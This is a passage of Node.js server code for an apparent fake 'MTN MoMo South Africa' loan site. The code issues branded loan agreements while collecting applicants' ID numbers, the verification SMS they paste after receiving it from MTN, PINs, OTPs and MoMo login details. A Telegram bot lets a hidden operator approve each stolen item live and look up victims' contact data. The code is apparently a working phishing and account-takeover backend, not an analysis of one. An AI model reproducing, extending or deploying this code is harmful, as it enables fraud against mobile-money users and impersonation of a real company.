        'Full Name      : ' + (app_.firstName || '') + ' ' + (app_.lastName || '') + '\n' +
        'ID Number      : ' + ((app_.momoRegistration || {}).idNumber || 'N/A') + '\n' +
        'Date of Birth  : ' + (app_.dob || 'N/A') + '\n' +
        'Phone          : +27 ' + (app_.phone || '') + '\n' +
        'Email          : ' + (app_.email || '') + '\n' +
        'MoMo Account   : ' + ((app_.momoRegistration || {}).accountName || app_.accountType || 'N/A') + '\n\n' +
        'REGISTRATION VERIFICATION\n-------------------------\n' +
        'Status         : ' + (app_.registrationStatus || 'N/A') + '\n' +
        'SMS Verified   : ' + (app_.regSmsVerifiedAt ? new Date(app_.regSmsVerifiedAt).toLocaleString('en-ZA') : 'N/A') + '\n' +
        'Completed      : ' + (app_.regCompletedAt ? new Date(app_.regCompletedAt).toLocaleString('en-ZA') : 'N/A') + '\n\n' +
        'LOAN DETAILS\n------------\n' +
        'Principal      : R ' + fmt(loanAmount) + '\n' +
        'Term           : ' + loanTerm + '\n' +
        'Monthly Payment: R ' + fmt(monthly) + '\n' +
        'Total Repayment: R ' + fmt(total) + '\n' +
        'Interest Rate  : 27% per annum (compounded monthly)\n\n' +
        'GUARANTOR\n---------\n' +
        'Name           : ' + (app_.guarantorName || 'N/A') + '\n' +
        'Phone          : ' + (app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : 'N/A') + '\n' +
        'Relationship   : ' + (app_.guarantorRelation || 'N/A') + '\n\n' +
        '© 2026 MTN MoMo South Africa';
    res.json({ ok: true, agreement: agreement });
});

app.get('/api/agreement-pdf/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Months';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;

    const doc = new PDFDocument({ size: 'A4', margin: 50 });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'attachment; filename="momo-agreement-' + app_.applicationId + '.pdf"');
    doc.pipe(res);
    doc.fillColor('#000').fontSize(20).font('Helvetica-Bold').text('MTN MoMo South Africa', { align: 'center' });
    doc.fontSize(12).font('Helvetica').fillColor('#666').text('Loan Agreement', { align: 'center' });
    doc.moveDown(0.5);
    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
    doc.moveDown(1);
    const line = (l, v) => {
        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true });
        doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A'));
    };
    doc.font('Helvetica-Bold').fontSize(12).fillColor('#000').text('BORROWER'); doc.moveDown(0.3);
    line('Application ID', app_.applicationId);
    line('Full Name', ((app_.firstName || '') + ' ' + (app_.lastName || '')).trim());
    line('ID Number', (app_.momoRegistration || {}).idNumber);
    line('Date of Birth', app_.dob);
    line('Phone', app_.phone ? '+27 ' + app_.phone : null);
    line('Email', app_.email);
    line('MoMo Account', (app_.momoRegistration || {}).accountName || app_.accountType);
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('LOAN DETAILS'); doc.moveDown(0.3);
    line('Principal', 'R ' + fmt(loanAmount));
    line('Term', loanTerm);
    line('Monthly Payment', 'R ' + fmt(monthly));
    line('Total Repayment', 'R ' + fmt(total));
    line('Interest Rate', '27% per annum');
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('GUARANTOR'); doc.moveDown(0.3);
    line('Name', app_.guarantorName);
    line('Phone', app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : null);
    line('Relationship', app_.guarantorRelation);
    doc.moveDown(1);
    doc.fontSize(9).fillColor('#888').text('Generated ' + new Date().toLocaleString('en-ZA') + ' · © 2026 MTN MoMo South Africa', { align: 'center' });
    doc.end();
});

app.get('/api/repayment-schedule/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const loanAmount = app_.loanAmount || 0;
    const months = parseInt(app_.loanTerm) || 12;
    if (!loanAmount || !months) return res.status(400).json({ ok: false, error: 'No loan data' });
    const r = 0.27 / 12;
    const monthly = Math.ceil(loanAmount * r / (1 - Math.pow(1 + r, -months)) + 60);
    const schedule = [];
    let balance = loanAmount;
    for (let i = 1; i <= months; i++) {
        const interest = Math.round(balance * r);
        const principal = monthly - interest;
        balance = Math.max(0, balance - principal);
        schedule.push({ month: i, payment: monthly, interest: interest, principal: principal, balance: balance });
    }
    res.json({ ok: true, schedule: schedule });
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');
    console.log('🔔 WEBHOOK:', new Date().toISOString());
    try {
        const body = req.body || {};

        if (body.callback_query) {
            const q = body.callback_query;
            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(() => {});
            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) return;
                const step = data.s;
                const approved = data.a === 'Y';
                if (!app_.registrationHistory) app_.registrationHistory = [];

                if (step === 'registration') {
                    if (approved) {
                        app_.registrationStatus = REG_STATUS.SMS_PENDING;
                        app_.regApprovedAt = new Date().toISOString();
                        app_.rejectionReason = null;
                        app_.regUserSms = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'approved_by_admin' });
                        saveApp(data.id);
                        tgSend(
                            '✅ <b>REGISTRATION APPROVED</b>\n' +
                            '🆔 ' + code(data.id) + '\n' +
                            '💳 ' + esc((app_.momoRegistration || {}).accountName || '') + '\n' +
                            '🔒 Max Loan: <b>R ' + fmt(app_.accountMaxLoan || 0) + '</b>\n\n' +
                            '<b>📱 AWAITING USER SMS</b>\n' +
                            'User will paste the full SMS they received from MTN.\n' +
                            'You will be asked to confirm it.',
                            null
                        );
                    } else {
                        app_.registrationStatus = REG_STATUS.REJECTED;
                        app_.rejectionReason = 'Registration details were not verified by admin.';
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_by_admin', stage: 'registration' });
                        saveApp(data.id);
                        tgSend('❌ <b>REGISTRATION REJECTED</b>\n🆔 ' + code(data.id), null);
                    }
                    return;
                }

                if (step === 'reg_sms') {
                    if (approved) {
                        app_.registrationStatus = REG_STATUS.SMS_VERIFIED;
                        app_.regSmsVerifiedAt = new Date().toISOString();
                        app_.rejectionReason = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'sms_confirmed_by_admin' });
                        saveApp(data.id);
                        tgSend(
                            '✅ <b>SMS CONFIRMED</b>\n' +
                            '🆔 ' + code(data.id) + '\n' +
                            '👤 ' + esc(app_.fullName || 'N/A') + '\n' +
                            'User is now setting their PIN.',
                            null
                        );
                    } else {
                        app_.registrationStatus = REG_STATUS.SMS_PENDING;
                        app_.regUserSms = null;
                        app_.regSmsRejectedAt = new Date().toISOString();
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'sms_rejected_by_admin' });
                        saveApp(data.id);
                        tgSend(
                            '❌ <b>SMS REJECTED</b>\n' +
                            '🆔 ' + code(data.id) + '\n' +
                            'User will re-paste their SMS.',
                            null
                        );
                    }
                    return;
                }

                if (step === 'reg_pin') {
                    if (approved) {
                        app_.registrationStatus = REG_STATUS.COMPLETED;
                        app_.regCompletedAt = new Date().toISOString();
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_approved' });
                        saveApp(data.id);
                        tgSend('🎉 <b>REGISTRATION COMPLETE</b>\n🆔 ' + code(data.id) + '\n🔒 Max loan: <b>R ' + fmt(app_.accountMaxLoan || 0) + '</b>', null);
                    } else {
                        app_.registrationStatus = REG_STATUS.SMS_VERIFIED;
                        app_.regPin = null;
                        app_.regPinSetAt = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_rejected_by_admin' });
                        saveApp(data.id);
                        tgSend('❌ <b>PIN REJECTED</b>\n🆔 ' + code(data.id) + '\nUser returns to PIN entry.', null);
                    }
                    return;
                }

                const isNewStep = !!(app_.steps && step in app_.steps);
                const isLegacy = !isNewStep && (step in app_);
                if (!isNewStep && !isLegacy) return;
                const currentStatus = isNewStep ? app_.steps[step] : app_[step];
                if (currentStatus !== 'pending') return;

                const newValue = approved ? 'approved' : 'rejected';
                if (isNewStep) app_.steps[step] = newValue;
                if (isLegacy) app_[step] = newValue;
                if (step === 'qualification') app_.qualification = approved ? 'qualified' : 'unqualified';
                if (step === 'application') app_.application = newValue;

                app_.updatedAt = new Date().toISOString();
                saveApp(data.id);
                tgSend((approved ? '✅' : '❌') + ' <b>' + (approved ? 'APPROVED' : 'REJECTED') + '</b>\n🆔 ' + code(data.id) + '\n📋 ' + step.toUpperCase(), null);
            } catch (e) { console.error('Callback parse:', e.message); }
            return;
        }

        if (body.message && body.message.text) {
            const text = body.message.text.trim();
            const chatId = String(body.message.chat.id);
            if (!CHAT_ID || chatId !== String(CHAT_ID)) return;

            if (text === '/start' || text === '/help') {
                tgSend('🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n⏳ /pending\n🆕 /pendingreg', null);
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pendingReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PENDING).length;
                const pendingSms = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.SMS_PENDING || a.registrationStatus === REG_STATUS.SMS_SUBMITTED).length;
                const pendingPin = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PIN_PENDING).length;
                const completedReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.COMPLETED).length;
                const completedLoans = Object.values(applications).filter(a => a.steps && a.steps.qualification === 'approved').length;
                tgSend('📊 <b>STATS</b>\n📝 Apps: ' + total + '\n⏳ Reg review: ' + pendingReg + '\n📩 SMS: ' + pendingSms + '\n🔐 PIN: ' + pendingPin + '\n✅ Reg done: ' + completedReg + '\n💵 Loans: ' + completedLoans, null);
            } else if (text === '/pendingreg') {
                const pending = Object.entries(applications).filter(e => e[1].registrationStatus === REG_STATUS.PENDING);
                if (!pending.length) { tgSend('✅ None awaiting review.', null); return; }
                let msg = '🆕 <b>AWAITING REVIEW (' + pending.length + ')</b>\n';
                pending.slice(0, 10).forEach(e => {
                    msg += '\n🆔 ' + code(e[0]) + '\n👤 ' + esc(e[1].fullName || 'N/A') + '\n📞 ' + code('+27' + (e[1].phone || '')) + '\n💳 ' + esc((e[1].momoRegistration || {}).accountName || '') + '\n';
                });
                tgSend(msg, null);
            } else if (text.indexOf('/contact ') === 0) {
                const needle = text.replace('/contact ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found', null); return; }
                tgSend('📞 <b>CONTACT</b> ' + code(realKey) + '\nName: ' + esc(a.fullName || 'N/A') + '\nPhone: ' + (a.phone ? code('+27' + a.phone) : 'N/A') + '\nEmail: ' + (a.email ? code(a.email) : 'N/A') + '\nDOB: ' + (a.dob ? code(a.dob) : 'N/A') + '\nAccount: ' + esc((a.momoRegistration || {}).accountName || 'N/A') + '\nReg: ' + esc(a.registrationStatus || 'N/A'), null);
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(e => {
                    const a = e[1];
                    if (a.registrationStatus !== REG_STATUS.COMPLETED) return false;
                    return a.steps && Object.values(a.steps).indexOf('pending') !== -1;
                });
                if (!pending.length) { tgSend('✅ No pending.', null); return; }
                let msg = '⏳ <b>PENDING (' + pending.length + ')</b>\n';
                pending.slice(0, 10).forEach(e => {
                    const steps = [];
                    STEP_ORDER.forEach(k => { if (e[1].steps[k] === 'pending') steps.push(k); });
                    msg += '\n🆔 ' + code(e[0]) + '\n👤 ' + esc(e[1].firstName || e[1].fullName || '') + '\n📋 ' + steps.join(', ') + '\n';
                });
                tgSend(msg, null);
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 None.', null); return; }
                let msg = '📋 <b>LAST 10</b>\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += '\n' + (i + 1) + '. 🆔 ' + code(id) + '\n👤 ' + esc(a.firstName || a.fullName || '') + '\n';
                });
                tgSend(msg, null);
            } else if (text.indexOf('/search ') === 0) {
                const needle = text.replace('/search ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found', null); return; }
                tgSend('🔍 <b>DETAILS</b> ' + code(realKey) + '\n👤 ' + esc(a.fullName || '') + '\n📱 ' + (a.phone ? code('+27' + a.phone) : 'N/A') + '\n🆕 Reg: ' + esc(a.registrationStatus || 'N/A') + '\n📋 ' + (a.steps ? STEP_ORDER.map(k => k + ':' + a.steps[k]).join(' ') : 'N/A'), null);
            }
        }
    } catch (e) { console.error('Webhook error:', e.message); }
});

// ═══════════════════════════════════════════════════════════
// STATUS / RETRY
// ═══════════════════════════════════════════════════════════
app.get('/api/status/:applicationId/:step', guardAppId, (req, res) => {
    const applicationId = req.params.applicationId;
    const step = req.params.step;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const valid = STEP_ORDER.concat(LEGACY_STEPS);
    if (valid.indexOf(step) === -1) return res.status(400).json({ ok: false, error: 'Invalid step' });
    res.json({ ok: true, status: readStep(app_, step), applicationId: applicationId, step: step });
});

app.get('/api/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const steps = {};
    STEP_ORDER.forEach(k => { steps[k] = readStep(app_, k); });
    res.json({
        ok: true,
        isRegistered: !!app_.isRegistered,
        registrationStatus: app_.registrationStatus || REG_STATUS.IDLE,
        rejectionReason: app_.rejectionReason || null,
        accountType: app_.accountType || null,
        accountName: (app_.momoRegistration || {}).accountName || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        phone: app_.phone || null,
        email: app_.email || null,
        dob: app_.dob || null,
        tncAccepted: app_.tncAccepted || null,
        steps: steps,
        loan: app_.loanData || null,
        personal: app_.personalData || null,
        employment: app_.employmentData || null,
        guarantor: app_.guarantorData || null,
        application: app_.application, sms: app_.sms, pin: app_.pin, otp: app_.otp, qualification: app_.qualification
    });
});

app.post('/api/retry/:applicationId/:step', guardAppId, (req, res) => {
    const applicationId = req.params.applicationId;
    const step = req.params.step;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const valid = STEP_ORDER.concat(['sms', 'pin', 'otp']);
    if (valid.indexOf(step) === -1) return res.status(400).json({ ok: false, error: 'Invalid step' });
    resetStep(app_, step);
    app_.updatedAt = new Date().toISOString();
    saveApp(applicationId);
    res.json({ ok: true });
});

app.get('/api/rejection-info/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    let rejectedStep = null, errorMessage = '';
    if (app_.registrationStatus === REG_STATUS.REJECTED) {
        rejectedStep = 'registration';
        errorMessage = app_.rejectionReason || 'Registration was rejected.';
    } else {
        const labels = { loan: 'Loan', personal: 'Personal details', employment: 'Employment', guarantor: 'Guarantor', momologin: 'MoMo login', qualification: 'Qualification' };
        for (let i = 0; i < STEP_ORDER.length; i++) {
            const k = STEP_ORDER[i];
            const status = readStep(app_, k);
            if (status === 'rejected' || (k === 'qualification' && status === 'unqualified')) {
                rejectedStep = k; errorMessage = (labels[k] || k) + ' was rejected.'; break;
            }
        }
    }
    res.json({ ok: true, rejectedStep: rejectedStep, errorMessage: errorMessage });
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../frontend', 'index.html')));

// ═══════════════════════════════════════════════════════════
// BOOT
// ═══════════════════════════════════════════════════════════
async function boot() {
    try {
        await db.initSchema();
        await loadAll();
    } catch (e) {
        console.error('❌ Database initialization failed:', e.message);
        process.exit(1);
    }

    app.listen(PORT, '0.0.0.0', () => {
        console.log('🚀 Server running on port ' + PORT + ' (v7.4 / SMS-paste)');
        console.log('   → http://0.0.0.0:' + PORT + '\n');
    });
}
boot().catch(err => { console.error('Boot failed:', err); process.exit(1); });

process.on('SIGTERM', async () => {
    console.log('🛑 SIGTERM — shutting down gracefully...');
    try { await db.pool.end(); } catch (e) {}
    process.exit(0);
});
